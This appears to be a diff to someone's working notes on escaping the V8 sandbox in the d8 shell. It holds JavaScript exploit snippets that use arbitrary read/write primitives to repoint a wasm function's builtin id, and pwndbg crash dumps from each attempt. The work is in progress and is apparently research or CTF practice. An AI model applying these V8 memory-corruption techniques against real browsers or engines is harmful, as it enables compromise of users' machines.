@@ -998,3 +998,131 @@ pwndbg>
 ```
 
 There's several sigsegv, but seems like all of them interacts inside sandbox. I need a function to escape it... 
+
+
+```js
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1717)*0x200);
+// v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1035)*0x200);
+console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
+
+// 
+v8_write32(0x180d35n + 0x27n, 0x41414141);
+v8_write32(0x1816c9n + 3n, 0x400600);
+// v8_write64(0x200145n - 1n, 0x4141414142424242n);
+
+// trigger
+instance.exports.func1(Number(target_page+1n));
+
+// ============ crash ===================================
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+0x0000555555e42398 in v8::internal::JSV8BreakIterator::BreakType(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSV8BreakIterator>) ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+*RAX  0x10018
+*RBX  0x555556f310d8 (v8::internal::MainCage::base_) —▸ 0x24d100000000 ◂— 0x40940
+*RCX  0x7fff78000000 ◂— 0x0
+*RDX  0x24d100180000 ◂— 0x184
+*RDI  0x555556fa6000 —▸ 0x24d100000000 ◂— 0x40940
+*RSI  0x24d100180000 ◂— 0x184
+*R8   0x24d1001c0000 ◂— 0x184
+*R9   0x3b3
+*R10  0x24d100000741 ◂— 0xfffff7ffff000006
+*R11  0x24d1001dfbb7 ◂— 0x7250000072500
+*R12  0x555557014ea0 —▸ 0x24d100181729 ◂— 0x450000024e001817
+*R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+*R14  0x24d100192da9 ◂— 0x25001c3e1d001971
+*R15  0x555557016730 ◂— 0x0
+*RBP  0x7fffffffd620 —▸ 0x7fffffffd650 —▸ 0x7fffffffd678 —▸ 0x7fffffffd730 —▸ 0x7fffffffd758 ◂— ...
+*RSP  0x7fffffffd610 —▸ 0x555557014eb0 —▸ 0x24d1001dfbf9 ◂— 0x2130060307001816
+*RIP  0x555555e42398 (v8::internal::JSV8BreakIterator::BreakType(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSV8BreakIterator>)+88) ◂— mov rax, qword ptr [rcx + rax*8]
+─────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x555555e42398 <v8::internal::JSV8BreakIterator::BreakType(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSV8BreakIterator>)+88>     mov    rax, qword ptr [rcx + rax*8]
+   0x555555e4239c <v8::internal::JSV8BreakIterator::BreakType(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSV8BreakIterator>)+92>     movabs rcx, 0xbf5a
+```
+
+0x7fff980104b0 —▸ 0x555556af2b80 (Builtins_InterpreterEntryTrampoline) ◂— mov r11d, dword ptr [rdi + 0xf]`
+
+```js
+8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x104b)*0x200);
+// v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1035)*0x200);
+console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
+
+// 
+v8_write32(0x180d35n + 0x27n, 0x41414141);
+v8_write32(0x1816c9n + 3n, 0x400600);
+// v8_write64(0x200145n - 1n, 0x4141414142424242n);
+
+// trigger
+instance.exports.func1(Number(target_page+1n));
+
+
+// =================== crash =================
+
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+0x0000555555c079ac in v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>) ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+*RAX  0x2264002bf801 ◂— 0x0
+*RBX  0x2033
+*RCX  0x555556f310e0 (v8::internal::TrustedCage::base_) —▸ 0x226400000000 ◂— 0x200984
+ RDX  0x0
+*RDI  0x555556fc5d40 ◂— 0x0
+*RSI  0x973001dfb85 ◂— 0xfe0040660000000d /* '\r' */
+ R8   0x0
+*R9   0x3b3
+*R10  0x1e15
+*R11  0x973001dfb85 ◂— 0xfe0040660000000d /* '\r' */
+*R12  0x555557014eb8 —▸ 0x973001dfb85 ◂— 0xfe0040660000000d /* '\r' */
+ R13  0x0
+*R14  0x973001dfbb5 ◂— 0x2500000725001923
+*R15  0x555556fa6000 —▸ 0x97300000000 ◂— 0x40940
+*RBP  0x7fffffffd4e0 —▸ 0x7fffffffd520 —▸ 0x7fffffffd570 —▸ 0x7fffffffd5f0 —▸ 0x7fffffffd640 ◂— ...
+*RSP  0x7fffffffd4a0 ◂— 0x555500000003
+*RIP  0x555555c079ac (v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>)+236) ◂— mov r12d, dword ptr [rax + 7]
+─────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x555555c079ac <v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>)+236>    mov    r12d, dword ptr [rax + 7]
+   0x555555c079b0 <v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>)+240>    sar    r12d, 1
+   0x555555c079b3 <v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>)+243>    mov    rdi, r15
+   0x555555c079b6 <v8::internal::TieringManager::InterruptBudgetFor(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::JSFunction>, std::__Cr::optional<v8::internal::CodeKind>)+246>    mov    rsi, r14
+```
+
+
+```js
+// 0x7fff980107b0 —▸ 0x555556af5d80 (Builtins_DebugBreakTrampoline) ◂— push rbp
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x107b)*0x200);
+//
+
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+0x0000555556af5f93 in Builtins_DebugBreakTrampoline ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+*RAX  0x2
+ RBX  0x0
+*RCX  0x411002bf801 ◂— 0x0
+*RDX  0x41100000069 ◂— 0x4
+*RDI  0x411001dfbb5 ◂— 0x2500000725001923
+*RSI  0x41100181729 ◂— 0x450000024e001817
+*R8   0x411002bf801 ◂— 0x0
+*R9   0x358e00102871 ◂— 0x10040660000001e
+*R10  0x7fff98000000 ◂— 0x0
+*R11  0x7fff54000000 ◂— 0x0
+*R12  0x181701
+*R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+*R14  0x41100000000 ◂— 0x40940
+*R15  0x181729
+*RBP  0x7fffffffd730 —▸ 0x7fffffffd758 —▸ 0x7fffffffd7d0 —▸ 0x7fffffffd930 —▸ 0x7fffffffd9a0 ◂— ...
+*RSP  0x7fffffffd6a0 —▸ 0x5555b6b81d7a ◂— mov qword ptr [rbp - 0x38], rax /* 0x1bbc8458948 */
+*RIP  0x555556af5f93 (Builtins_DebugBreakTrampoline+531) ◂— mov ecx, dword ptr [rcx + 3]
+─────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x555556af5f93 <Builtins_DebugBreakTrampoline+531>    mov    ecx, dword ptr [rcx + 3]
+   0x555556af5f96 <Builtins_DebugBreakTrampoline+534>    shr    ecx, 9
+   0x555556af5f99 <Builtins_DebugBreakTrampoline+537>    shl    ecx, 4
+   0x555556af5f9c <Builtins_DebugBreakTrampoline+540>    mov    rcx, qword ptr [r10 + rcx]
+   0x555556af5fa0 <Builtins_DebugBreakTrampoline+544>    jmp    rcx
+```
+
+```js
+
+```
+
+**New idea: changing wasm function to make rbx controlable**
